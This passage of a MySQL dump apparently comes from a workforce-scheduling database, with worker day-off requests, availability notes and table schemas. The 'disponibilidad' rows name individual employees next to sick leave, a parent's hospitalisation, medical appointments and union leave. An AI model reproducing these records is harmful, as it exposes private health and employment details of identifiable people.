09:21:42'),(802,457,'2022-11-17','DEVOLUCION COMPUTO','2022-11-17',NULL,0,'ACEPTADO',NULL,701,'2022-09-22 16:31:42','2022-09-23 06:16:33'),(803,457,'2022-11-18','DEVOLUCION COMPUTO','2022-11-18',NULL,0,'ACEPTADO',NULL,702,'2022-09-22 16:31:58','2022-09-23 06:16:41'),(804,457,'2022-11-19','DEVOLUCION COMPUTO','2022-11-19',NULL,0,'ACEPTADO',NULL,703,'2022-09-22 16:37:46','2022-09-23 06:16:45'),(805,457,'2022-11-15','DEVOLUCION COMPUTO','2022-11-15',NULL,0,'ACEPTADO',NULL,704,'2022-09-23 17:10:29','2022-09-23 17:17:24'),(806,457,'2022-11-16','DEVOLUCION COMPUTO','2022-11-16',NULL,0,'ACEPTADO',NULL,705,'2022-09-23 17:11:02','2022-09-23 17:13:24'),(807,159,'2022-10-10','DEVOLUCION COMPUTO','2022-10-10',NULL,0,'ACEPTADO',NULL,706,'2022-10-01 14:04:26','2022-10-02 13:34:22'),(808,450,'2022-10-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,707,'2022-10-13 16:23:17','2022-10-13 16:23:17'),(809,449,'2022-10-23','DEVOLUCION COMPUTO','2022-10-23',NULL,0,'PENDIENTE',NULL,708,'2022-10-18 04:27:04','2022-10-18 04:27:04'),(810,448,'2022-12-21','DEVOLUCION COMPUTO','2022-12-21',NULL,0,'ACEPTADO',NULL,709,'2022-12-02 11:13:47','2022-12-02 11:43:51'),(811,448,'2022-12-22','DEVOLUCION COMPUTO','2022-12-22',NULL,0,'ACEPTADO',NULL,710,'2022-12-02 11:15:35','2022-12-02 11:43:37'),(812,167,'2023-02-08','necesidades personales',NULL,'',1,'PENDIENTE',NULL,NULL,'2023-02-09 13:41:09','2023-02-09 13:41:09'),(813,393,'2023-05-01','Pido el dГӯa a cambio del que me solicito la empresa el dГӯa domingo 19 de febrero.',NULL,NULL,0,'ACEPTADO','',NULL,'2023-03-17 11:40:10','2023-03-21 06:23:39'),(819,247,'2023-04-11','DEVOLUCION COMPUTO','2023-04-11','',0,'PENDIENTE',NULL,NULL,'2023-03-20 11:51:58','2023-03-21 06:11:20'),(820,247,'2023-04-12','DEVOLUCION COMPUTO','2023-04-12',NULL,0,'PENDIENTE',NULL,NULL,'2023-03-20 11:52:29','2023-03-20 11:52:29'),(821,247,'2023-04-13','DEVOLUCION COMPUTO','2023-04-13',NULL,0,'PENDIENTE',NULL,NULL,'2023-03-20 11:53:04','2023-03-20 11:53:04'),(822,247,'2023-05-23','DEVOLUCION COMPUTO','2023-05-23',NULL,0,'PENDIENTE',NULL,NULL,'2023-03-20 11:53:46','2023-03-20 11:53:46'),(823,247,'2023-05-24','DEVOLUCION COMPUTO','2023-05-24',NULL,0,'PENDIENTE',NULL,NULL,'2023-03-20 11:54:38','2023-03-20 11:54:38'),(824,196,'2023-04-13','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,721,'2023-03-23 12:00:12','2023-03-23 12:00:12'),(825,197,'2023-08-21','DEVOLUCION COMPUTO','2023-08-21',NULL,0,'ACEPTADO',NULL,722,'2023-04-12 12:35:06','2023-04-13 04:58:28'),(826,197,'2023-08-22','DEVOLUCION COMPUTO','2023-08-22',NULL,0,'ACEPTADO',NULL,723,'2023-04-12 12:35:55','2023-04-13 04:58:33'),(827,196,'2023-08-26','DEVOLUCION COMPUTO','2023-08-26',NULL,0,'ACEPTADO',NULL,724,'2023-05-09 15:19:53','2023-05-10 06:30:55'),(828,196,'2023-08-27','DEVOLUCION COMPUTO','2023-08-27',NULL,0,'ACEPTADO',NULL,725,'2023-05-09 15:21:03','2023-05-10 06:30:41'),(829,196,'2023-08-19','DEVOLUCION COMPUTO','2023-08-19',NULL,0,'ACEPTADO',NULL,726,'2023-05-09 15:22:18','2023-05-10 06:32:03'),(830,196,'2023-08-20','DEVOLUCION COMPUTO','2023-08-20',NULL,0,'ACEPTADO',NULL,727,'2023-05-09 15:23:11','2023-05-10 06:32:12'),(831,202,'2023-06-22','DEVOLUCION COMPUTO','2023-06-22','',0,'PENDIENTE',NULL,728,'2023-05-22 07:32:48','2023-05-22 10:54:56'),(832,450,'2023-06-26','DEVOLUCION COMPUTO','2023-06-26',NULL,0,'ACEPTADO',NULL,729,'2023-05-26 11:02:35','2023-05-26 11:13:42'),(834,450,'2023-07-24','DEVOLUCION COMPUTO','2023-07-24',NULL,0,'ACEPTADO',NULL,731,'2023-06-28 15:55:26','2023-06-29 04:57:38'),(836,450,'2023-11-06','DEVOLUCION COMPUTO','2023-11-06',NULL,0,'ACEPTADO',NULL,733,'2023-09-28 20:46:21','2023-10-05 06:12:18'),(837,450,'2023-12-14','DEVOLUCION COMPUTO','2023-12-14',NULL,0,'ACEPTADO',NULL,734,'2023-11-15 12:53:36','2023-11-15 13:05:27'),(838,450,'2023-12-13','DEVOLUCION COMPUTO','2023-12-13',NULL,0,'ACEPTADO',NULL,735,'2023-11-15 12:57:28','2023-11-15 13:05:08'),(839,200,'2023-12-09','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,736,'2023-11-30 10:39:53','2023-11-30 10:39:53'),(840,200,'2023-12-10','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,737,'2023-11-30 10:40:08','2023-11-30 10:40:08'),(841,424,'2023-12-17','asuntos personales',NULL,'',0,'PENDIENTE',NULL,NULL,'2023-12-05 08:15:27','2023-12-05 08:15:27'),(842,459,'2023-12-17','DEVOLUCION COMPUTO','2023-12-17',NULL,0,'ACEPTADO',NULL,738,'2023-12-05 13:33:45','2023-12-05 13:37:40'),(843,197,'2024-07-22','DEVOLUCION COMPUTO','2024-07-22',NULL,0,'ACEPTADO',NULL,NULL,'2024-01-22 15:53:01','2024-01-23 13:29:35'),(844,197,'2024-07-23','DEVOLUCION COMPUTO','2024-07-23',NULL,0,'ACEPTADO',NULL,NULL,'2024-01-22 15:53:49','2024-01-23 13:29:51'),(845,476,'2024-03-01','DEVOLUCION COMPUTO','2024-03-01',NULL,0,'ACEPTADO',NULL,743,'2024-02-01 11:17:43','2024-02-01 12:14:59'),(846,451,'2024-08-06','DEVOLUCION COMPUTO','2024-08-06',NULL,0,'ACEPTADO',NULL,744,'2024-02-02 12:41:32','2024-02-05 06:10:39'),(847,451,'2024-08-07','DEVOLUCION COMPUTO','2024-08-07',NULL,0,'ACEPTADO',NULL,745,'2024-02-02 12:42:15','2024-02-05 06:10:35'),(848,451,'2024-08-08','DEVOLUCION COMPUTO','2024-08-08',NULL,0,'ACEPTADO',NULL,746,'2024-02-02 12:42:49','2024-02-05 06:10:31'),(849,292,'2024-03-11','DEVOLUCION COMPUTO','2024-03-11',NULL,0,'ACEPTADO',NULL,747,'2024-02-09 04:50:41','2024-02-09 05:28:38'),(851,292,'2024-03-13','DEVOLUCION COMPUTO','2024-03-13',NULL,0,'ACEPTADO',NULL,749,'2024-02-09 04:51:28','2024-02-09 05:28:46'),(852,451,'2024-08-10','DEVOLUCION COMPUTO','2024-08-10',NULL,0,'ACEPTADO',NULL,750,'2024-03-04 08:01:43','2024-03-04 08:40:50'),(853,451,'2024-08-11','DEVOLUCION COMPUTO','2024-08-11',NULL,0,'ACEPTADO',NULL,751,'2024-03-04 08:02:36','2024-03-04 08:40:57'),(854,476,'2024-04-06','DEVOLUCION COMPUTO','2024-04-06',NULL,0,'ACEPTADO',NULL,752,'2024-03-16 14:28:37','2024-03-17 06:46:13'),(855,476,'2024-04-07','DEVOLUCION COMPUTO','2024-04-07',NULL,0,'ACEPTADO',NULL,753,'2024-03-17 23:05:49','2024-03-18 05:52:56'),(856,455,'2024-07-07','DEVOLUCION COMPUTO','2024-07-07',NULL,0,'ACEPTADO',NULL,754,'2024-04-05 18:23:09','2024-04-08 05:46:48'),(857,455,'2024-07-06','DEVOLUCION COMPUTO','2024-07-06',NULL,0,'ACEPTADO',NULL,755,'2024-04-05 18:23:28','2024-04-08 05:46:55'),(858,451,'2024-08-01','DEVOLUCION COMPUTO','2024-08-01',NULL,0,'ACEPTADO',NULL,756,'2024-04-11 19:06:14','2024-04-12 05:08:53'),(859,443,'2024-06-10','DEVOLUCION COMPUTO','2024-06-10',NULL,0,'PENDIENTE',NULL,757,'2024-04-28 16:24:50','2024-04-28 16:24:50'),(860,443,'2024-06-11','DEVOLUCION COMPUTO','2024-06-11',NULL,0,'PENDIENTE',NULL,758,'2024-04-28 16:26:13','2024-04-28 16:26:13'),(861,451,'2024-07-02','DEVOLUCION COMPUTO','2024-07-02',NULL,0,'ACEPTADO',NULL,759,'2024-05-16 10:52:36','2024-05-17 05:06:32'),(862,451,'2024-07-03','DEVOLUCION COMPUTO','2024-07-03',NULL,0,'ACEPTADO',NULL,760,'2024-05-16 10:53:00','2024-05-17 05:06:36'),(863,451,'2024-07-04','DEVOLUCION COMPUTO','2024-07-04',NULL,0,'ACEPTADO',NULL,761,'2024-05-16 10:53:19','2024-06-19 08:03:20'),(865,443,'2024-07-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,762,'2024-05-17 05:09:17','2024-05-17 05:09:17'),(866,443,'2024-07-21','sobrante computo',NULL,NULL,0,'ACEPTADO','',763,'2024-05-19 01:38:04','2024-05-20 06:13:56'),(867,449,'2024-09-02','DEVOLUCION COMPUTO','2024-09-02',NULL,0,'ACEPTADO',NULL,764,'2024-06-05 04:11:26','2024-06-10 05:30:46'),(868,449,'2024-09-06','DEVOLUCION COMPUTO','2024-09-06',NULL,0,'ACEPTADO',NULL,765,'2024-06-05 04:11:59','2024-06-10 05:32:00'),(869,449,'2024-09-07','DEVOLUCION COMPUTO','2024-09-07',NULL,0,'ACEPTADO',NULL,766,'2024-06-05 04:12:49','2024-06-10 05:32:10'),(870,449,'2024-09-08','DEVOLUCION COMPUTO','2024-09-08',NULL,0,'ACEPTADO',NULL,767,'2024-06-05 04:13:17','2024-06-10 05:34:11'),(871,443,'2024-07-22','exceso computo ',NULL,NULL,0,'ACEPTADO','',768,'2024-06-12 04:19:46','2024-06-12 04:56:23'),(872,292,'2024-09-06','DEVOLUCION COMPUTO','2024-09-06',NULL,0,'ACEPTADO',NULL,769,'2024-06-13 04:39:09','2024-06-13 08:25:25'),(873,458,'2024-07-04','DEVOLUCION COMPUTO','2024-07-04',NULL,0,'ACEPTADO',NULL,770,'2024-06-13 10:50:04','2024-06-13 10:51:14'),(875,253,'2024-08-09','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,771,'2024-07-04 11:26:31','2024-07-04 11:26:31'),(876,253,'2024-08-10','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,772,'2024-07-04 11:27:06','2024-07-04 11:27:06'),(877,253,'2024-08-11','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,773,'2024-07-04 11:27:27','2024-07-04 11:27:27'),(878,467,'2024-08-20','DEVOLUCION COMPUTO','2024-08-20',NULL,0,'ACEPTADO',NULL,774,'2024-07-09 03:49:33','2024-07-09 05:18:37'),(879,451,'2024-07-22','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,775,'2024-07-16 06:02:10','2024-07-16 06:02:10'),(880,451,'2024-08-09','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,776,'2024-07-16 06:04:03','2024-07-16 06:04:03'),(881,247,'2024-10-08','DEVOLUCION COMPUTO','2024-10-08',NULL,0,'ACEPTADO',NULL,777,'2024-08-30 22:21:33','2024-09-02 05:44:38'),(882,247,'2024-10-09','DEVOLUCION COMPUTO','2024-10-09',NULL,0,'ACEPTADO',NULL,778,'2024-08-30 22:22:05','2024-09-02 05:44:44'),(883,247,'2024-10-10','DEVOLUCION COMPUTO','2024-10-10',NULL,0,'ACEPTADO',NULL,779,'2024-08-30 22:22:38','2024-09-02 05:44:51'),(884,247,'2024-10-15','DEVOLUCION COMPUTO','2024-10-15',NULL,0,'ACEPTADO',NULL,780,'2024-08-30 22:23:19','2024-09-02 05:44:57'),(885,244,'2024-09-26','DEVOLUCION COMPUTO','2024-09-26',NULL,0,'ACEPTADO',NULL,781,'2024-09-01 20:11:33','2024-09-02 06:08:30'),(886,467,'2024-10-13','DEVOLUCION COMPUTO','2024-10-13',NULL,0,'ACEPTADO',NULL,782,'2024-10-01 03:44:20','2024-10-01 05:10:08'),(887,443,'2024-11-18','DEVOLUCION COMPUTO','2024-11-18',NULL,0,'ACEPTADO',NULL,783,'2024-11-05 17:30:09','2024-11-06 06:25:37'),(888,306,'2024-11-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,784,'2024-11-11 08:35:02','2024-11-11 08:35:02'),(889,291,'2025-01-10','DEVOLUCION COMPUTO','2025-01-10',NULL,0,'PENDIENTE',NULL,785,'2024-12-11 01:22:03','2024-12-11 01:22:03'),(890,479,'2024-12-27','DEVOLUCION COMPUTO','2024-12-27',NULL,0,'PENDIENTE',NULL,786,'2024-12-18 15:53:02','2024-12-18 15:53:02'),(891,479,'2024-12-28','DEVOLUCION COMPUTO','2024-12-28',NULL,0,'PENDIENTE',NULL,787,'2024-12-18 15:53:30','2024-12-18 15:53:30'),(892,291,'2025-01-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,NULL,'2025-01-27 06:47:52','2025-01-27 06:47:52'),(893,291,'2025-02-15','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,NULL,'2025-01-27 06:48:56','2025-01-27 06:48:56'),(894,196,'2025-08-23','DEVOLUCION COMPUTO','2025-08-23',NULL,0,'ACEPTADO',NULL,792,'2025-01-29 11:03:52','2025-01-29 11:18:28'),(895,196,'2025-08-24','DEVOLUCION COMPUTO','2025-08-24',NULL,0,'ACEPTADO',NULL,793,'2025-01-29 11:04:31','2025-01-29 11:18:45'),(896,197,'2025-02-24','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,794,'2025-01-31 05:51:57','2025-01-31 05:51:57'),(899,202,'2025-08-12','DEVOLUCION COMPUTO','2025-08-12',NULL,0,'PENDIENTE',NULL,797,'2025-02-08 06:14:16','2025-02-08 06:14:16'),(900,202,'2025-08-13','DEVOLUCION COMPUTO','2025-08-13',NULL,0,'PENDIENTE',NULL,798,'2025-02-08 06:14:56','2025-02-08 06:14:56'),(901,492,'2025-03-01','DEVOLUCION COMPUTO','2025-03-01',NULL,0,'ACEPTADO',NULL,799,'2025-02-18 13:36:46','2025-02-19 06:18:50'),(902,476,'2025-03-13','DEVOLUCION COMPUTO','2025-03-13',NULL,0,'PENDIENTE',NULL,800,'2025-02-19 14:23:51','2025-02-19 14:23:51'),(903,244,'2025-04-15','DEVOLUCION COMPUTO','2025-04-15',NULL,0,'ACEPTADO',NULL,801,'2025-02-28 08:21:00','2025-03-03 06:17:18'),(904,244,'2025-04-16','DEVOLUCION COMPUTO','2025-04-16',NULL,0,'ACEPTADO',NULL,802,'2025-02-28 08:21:46','2025-03-03 06:17:30'),(905,244,'2025-04-17','DEVOLUCION COMPUTO','2025-04-17',NULL,0,'ACEPTADO',NULL,803,'2025-02-28 08:22:24','2025-03-03 06:17:36'),(907,450,'2025-05-05','DEVOLUCION COMPUTO','2025-05-05',NULL,0,'ACEPTADO',NULL,805,'2025-04-11 05:01:24','2025-04-11 05:11:43'),(909,455,'2025-07-05','DEVOLUCION COMPUTO','2025-07-05',NULL,0,'ACEPTADO',NULL,807,'2025-04-22 04:35:09','2025-04-22 05:28:46'),(910,455,'2025-07-06','DEVOLUCION COMPUTO','2025-07-06',NULL,0,'ACEPTADO',NULL,808,'2025-04-22 04:35:51','2025-04-22 05:28:51'),(911,455,'2025-07-07','DEVOLUCION COMPUTO','2025-07-07',NULL,0,'PENDIENTE',NULL,809,'2025-04-22 04:49:04','2025-04-22 04:49:04'),(912,244,'2025-06-21','DEVOLUCION COMPUTO','2025-06-21',NULL,0,'ACEPTADO',NULL,810,'2025-04-24 05:16:37','2025-04-24 05:31:16'),(914,492,'2025-05-31','DEVOLUCION COMPUTO','2025-05-31',NULL,0,'ACEPTADO',NULL,812,'2025-05-05 21:04:54','2025-05-06 04:55:03'),(915,489,'2025-08-07','DEVOLUCION COMPUTO','2025-08-07',NULL,0,'ACEPTADO',NULL,813,'2025-05-26 17:33:41','2025-05-27 05:19:17'),(917,492,'2025-07-04','DEVOLUCION COMPUTO','2025-07-04',NULL,0,'ACEPTADO',NULL,814,'2025-06-22 20:17:32','2025-06-23 05:29:57'),(919,239,'2025-08-01','DEVOLUCION COMPUTO','2025-08-01',NULL,0,'ACEPTADO',NULL,816,'2025-07-07 10:22:32','2025-07-10 10:40:52'),(920,239,'2025-08-02','DEVOLUCION COMPUTO','2025-08-02',NULL,0,'ACEPTADO',NULL,817,'2025-07-07 10:23:02','2025-07-10 10:41:03'),(921,239,'2025-08-03','DEVOLUCION COMPUTO','2025-08-03',NULL,0,'ACEPTADO',NULL,818,'2025-07-07 10:23:24','2025-07-10 10:41:10'),(922,239,'2025-08-04','DEVOLUCION COMPUTO','2025-08-04',NULL,0,'ACEPTADO',NULL,819,'2025-07-07 10:23:42','2025-07-10 10:41:16'),(923,239,'2025-09-08','DEVOLUCION COMPUTO','2025-09-08',NULL,0,'ACEPTADO',NULL,820,'2025-07-07 10:24:15','2025-07-08 11:00:37'),(924,239,'2025-09-09','DEVOLUCION COMPUTO','2025-09-09',NULL,0,'ACEPTADO',NULL,821,'2025-07-07 10:24:43','2025-07-08 11:00:42'),(927,489,'2025-10-26','DEVOLUCION COMPUTO','2025-10-26',NULL,0,'ACEPTADO',NULL,824,'2025-08-01 04:51:26','2025-08-11 14:55:44'),(928,485,'2025-08-16','exceso de computo','2025-08-16','exceso de computo',0,'ACEPTADO','',825,'2025-08-02 05:37:30','2025-08-02 05:38:10'),(929,443,'2025-09-04','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,826,'2025-08-28 09:59:15','2025-08-28 09:59:15'),(931,207,'2025-11-07','DEVOLUCION COMPUTO','2025-11-07',NULL,0,'ACEPTADO',NULL,827,'2025-09-18 06:06:06','2025-09-18 06:14:50'),(932,371,'2025-08-18','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,828,'2025-10-06 08:37:59','2025-10-06 08:37:59'),(933,371,'2025-08-19','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,829,'2025-10-06 08:38:18','2025-10-06 08:38:18'),(934,371,'2025-08-20','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,830,'2025-10-06 08:38:32','2025-10-06 08:38:32'),(935,371,'2025-08-21','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,831,'2025-10-06 08:38:47','2025-10-06 08:38:47'),(936,402,'2025-08-26','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,832,'2025-10-06 09:13:31','2025-10-06 09:13:31'),(937,292,'2025-11-26','DEVOLUCION COMPUTO','2025-11-26',NULL,0,'ACEPTADO',NULL,833,'2025-11-03 13:53:41','2025-11-04 06:05:05'),(938,292,'2025-11-27','DEVOLUCION COMPUTO','2025-11-27',NULL,0,'ACEPTADO',NULL,834,'2025-11-03 13:54:15','2025-11-04 06:05:15'),(939,492,'2025-11-22','DEVOLUCION COMPUTO','2025-11-22',NULL,0,'ACEPTADO',NULL,835,'2025-11-06 13:43:50','2025-11-07 05:57:26'),(940,492,'2025-11-29','DEVOLUCION COMPUTO','2025-11-29',NULL,0,'ACEPTADO',NULL,836,'2025-11-06 13:45:01','2025-11-07 05:57:30'),(941,492,'2025-11-23','DEVOLUCION COMPUTO','2025-11-23',NULL,0,'ACEPTADO',NULL,837,'2025-11-06 13:46:02','2025-11-07 05:57:36'),(942,476,'2025-12-22','DEVOLUCION COMPUTO','2025-12-22',NULL,0,'PENDIENTE',NULL,838,'2025-11-07 10:38:31','2025-11-07 10:38:31'),(943,476,'2025-12-23','DEVOLUCION COMPUTO','2025-12-23',NULL,0,'PENDIENTE',NULL,839,'2025-11-07 10:38:55','2025-11-07 10:38:55'),(944,363,'2026-03-29','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,840,'2026-02-19 09:34:55','2026-02-19 09:34:55'),(945,196,'2026-08-12','DEVOLUCION COMPUTO','2026-08-12',NULL,0,'ACEPTADO',NULL,841,'2026-03-01 15:59:44','2026-03-03 06:25:18'),(946,196,'2026-08-13','DEVOLUCION COMPUTO','2026-08-13',NULL,0,'ACEPTADO',NULL,842,'2026-03-01 16:00:32','2026-03-03 06:25:24'),(947,196,'2026-08-15','DEVOLUCION COMPUTO','2026-08-15',NULL,0,'ACEPTADO',NULL,843,'2026-03-01 16:01:34','2026-03-03 06:25:48'),(948,492,'2026-03-13','DEVOLUCION COMPUTO','2026-03-13',NULL,0,'ACEPTADO',NULL,844,'2026-03-03 13:14:04','2026-03-03 13:30:41'),(950,465,'2026-04-18','DEVOLUCION COMPUTO','2026-04-18',NULL,0,'ACEPTADO',NULL,846,'2026-03-10 21:35:54','2026-03-11 07:21:47'),(952,499,'2026-06-30','DEVOLUCION COMPUTO','2026-06-30',NULL,0,'ACEPTADO',NULL,848,'2026-03-19 22:11:16','2026-03-23 07:47:33'),(953,499,'2026-07-01','DEVOLUCION COMPUTO','2026-07-01',NULL,0,'ACEPTADO',NULL,849,'2026-03-19 22:11:59','2026-03-23 07:47:39'),(954,499,'2026-06-29','DEVOLUCION COMPUTO','2026-06-29',NULL,0,'ACEPTADO',NULL,850,'2026-03-19 22:12:31','2026-03-23 07:47:46'),(955,499,'2026-06-28','DEVOLUCION COMPUTO','2026-06-28',NULL,0,'ACEPTADO',NULL,851,'2026-03-19 22:13:12','2026-03-23 07:47:50'),(956,499,'2026-06-27','DEVOLUCION COMPUTO',NULL,NULL,0,'ACEPTADO',NULL,852,'2026-04-14 10:57:10','2026-04-14 10:57:10'),(957,292,'2026-06-02','DEVOLUCION COMPUTO','2026-06-02',NULL,0,'ACEPTADO',NULL,853,'2026-04-15 11:12:38','2026-04-15 12:08:46'),(958,292,'2026-06-04','DEVOLUCION COMPUTO','2026-06-04',NULL,0,'ACEPTADO',NULL,854,'2026-04-15 11:13:14','2026-04-15 12:08:51'),(959,510,'2026-10-09','DEVOLUCION COMPUTO','2026-10-09',NULL,0,'ACEPTADO',NULL,855,'2026-04-22 12:02:19','2026-04-23 05:25:16'),(960,510,'2026-10-10','DEVOLUCION COMPUTO','2026-10-10',NULL,0,'ACEPTADO',NULL,856,'2026-04-22 12:03:12','2026-04-23 05:25:44'),(961,510,'2026-10-11','DEVOLUCION COMPUTO','2026-10-11',NULL,0,'ACEPTADO',NULL,857,'2026-04-22 12:03:32','2026-04-23 05:25:49'),(962,510,'2026-10-12','DEVOLUCION COMPUTO','2026-10-12',NULL,0,'ACEPTADO',NULL,858,'2026-04-22 12:03:58','2026-04-23 05:25:55');
/*!40000 ALTER TABLE `dias_pedidos_trabajador` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `disponibilidad`
--

DROP TABLE IF EXISTS `disponibilidad`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `disponibilidad` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `codigo_agente` int(11) NOT NULL,
  `year` int(11) NOT NULL,
  `fecha` date NOT NULL,
  `observacion` text CHARACTER SET latin1 COLLATE latin1_swedish_ci DEFAULT NULL,
  `created` datetime DEFAULT NULL,
  `modified` datetime DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `codigo_agente_2` (`codigo_agente`,`year`,`fecha`),
  KEY `codigo_agente` (`codigo_agente`),
  CONSTRAINT `disponibilidad_ibfk_1` FOREIGN KEY (`codigo_agente`) REFERENCES `agentes` (`codigo_agente`)
) ENGINE=InnoDB AUTO_INCREMENT=31 DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `disponibilidad`
--

LOCK TABLES `disponibilidad` WRITE;
/*!40000 ALTER TABLE `disponibilidad` DISABLE KEYS */;
INSERT INTO `disponibilidad` VALUES (3,167,2018,'2018-01-29','','2018-01-25 18:46:11','2018-01-25 18:46:11'),(4,293,2018,'2018-01-22','Descanso para trabajar el 23','2018-01-29 05:58:40','2018-01-29 05:58:40'),(5,293,2018,'2018-01-23','','2018-01-29 05:58:56','2018-01-29 05:58:56'),(6,228,2018,'2018-03-24','','2018-03-20 07:12:27','2018-03-20 07:12:27'),(7,159,2018,'2018-08-16','Baja Estitxu','2018-08-21 10:53:07','2018-08-21 10:53:28'),(8,196,2018,'2018-10-23','Licencias sindicales','2018-11-06 07:25:29','2018-11-06 07:25:29'),(9,196,2019,'2019-04-09','por cubrir licencia sindical turno','2019-04-10 08:38:29','2019-04-10 08:38:29'),(10,159,2019,'2019-09-18','Licencia Estela Aguado','2019-10-01 10:20:42','2019-10-01 10:20:42'),(11,245,2019,'2019-10-22','Por ingreso familiar Marian Artigas','2019-10-25 04:45:58','2019-10-25 04:45:58'),(12,239,2019,'2019-11-06','entrega premio 25 aГұos y jubilaciГіn','2019-11-04 08:17:30','2019-11-04 08:18:00'),(13,371,2020,'2020-02-14','T4 de Atxuri por IT en Donosti y enviar allГӯ a Jon Sanz','2020-02-20 09:18:14','2020-02-20 09:18:14'),(14,207,2020,'2020-07-17','Cubre baja de EГұaut Aizpurua','2020-07-17 08:10:45','2020-07-17 08:10:45'),(15,291,2020,'2020-07-24','HospitalizaciГіn padre Juan Silva','2020-07-23 09:58:06','2020-07-23 09:58:06'),(16,159,2020,'2020-08-19','Baja EГұaut Aizpurua','2020-08-12 12:38:44','2020-08-12 12:41:47'),(17,244,2020,'2020-08-18','Baja EГұaut Aizpurua','2020-08-12 12:39:18','2020-08-12 12:42:15'),(18,395,2020,'2020-11-16','turno t6','2020-11-03 16:48:48','2020-11-03 16:48:48'),(19,421,2020,'2020-12-11','Licencia Aitor Gartzia','2020-12-03 11:57:05','2020-12-03 11:57:30'),(20,253,2021,'2021-07-05','Para cubrir turno M7','2021-06-22 06:38:53','2021-06-22 06:38:53'),(21,395,2021,'2021-08-20','Anulado, no lo puedo borrar','2021-08-12 09:38:55','2021-08-20 10:05:06'),(22,371,2021,'2021-08-25','medico Alez Gerrikabeitia','2021-09-13 11:58:49','2021-09-13 11:58:49'),(23,371,2021,'2021-09-22','licencia medica jon Sanz','2021-09-13 11:59:34','2021-09-13 11:59:34'),(24,380,2022,'2022-02-02','licencia Gontzal','2022-01-27 11:57:30','2022-01-27 11:57:48'),(25,89,2022,'2022-02-11','licencia de Roberto Jimenez','2022-02-14 07:24:11','2022-02-14 07:24:11'),(26,443,2022,'2022-03-08','Por baja de Nekane Oiartzabal','2022-03-11 06:01:44','2022-03-11 06:01:44'),(27,421,2022,'2022-06-12','it de alberto Sanchez','2022-06-15 07:52:57','2022-06-15 07:52:57'),(28,245,2023,'2023-03-14','M1','2023-03-09 13:34:19','2023-03-09 13:34:19'),(29,287,2023,'2023-03-14','T4','2023-03-09 13:40:42','2023-03-09 13:40:42'),(30,197,2023,'2023-06-13','','2023-07-04 10:32:53','2023-07-04 10:32:53');
/*!40000 ALTER TABLE `disponibilidad` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `estaciones`
--

DROP TABLE IF EXISTS `estaciones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `estaciones` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `estacion` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `nemonico` varchar(50) CHARACTER SET utf8mb4 COLLATE utf8mb4_general_ci NOT NULL,
  `pk` double NOT NULL,
  `puesto_id` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `pm_id` (`puesto_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 COLLATE=utf8_spanish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `estaciones`
--

LOCK TABLES `estaciones` WRITE;
/*!40000 ALTER TABLE `estaciones` DISABLE KEYS */;
/*!40000 ALTER TABLE `estaciones` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `estados`
--

DROP TABLE IF EXISTS `estados`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `estados` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `estado` varchar(50) NOT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `estado` (`estado`),
  UNIQUE KEY `estado_2` (`estado`)
) ENGINE=InnoDB AUTO_INCREMENT=8 DEFAULT CHARSET=latin1 COLLATE=latin1_swedish_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `estados`
--

LOCK TABLES `estados` WRITE;
/*!40000 ALTER TABLE `estados` DISABLE KEYS */;
INSERT INTO `estados` VALUES (5,'BAJA LARGA'),(4,'DESTACADO'),(1,'DISPONIBLE'),(6,'JUBILACION'),(2,'LIBERADO'),(3,'MEDIA JORNADA'),(7,'PROMOCION');
/*!40000 ALTER TABLE `estados` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `formaciones`
--

DROP TABLE IF EXISTS `formaciones`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `formaciones` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `fecha_inicio` date NOT NULL,
  `fecha_fin` date NOT NULL,
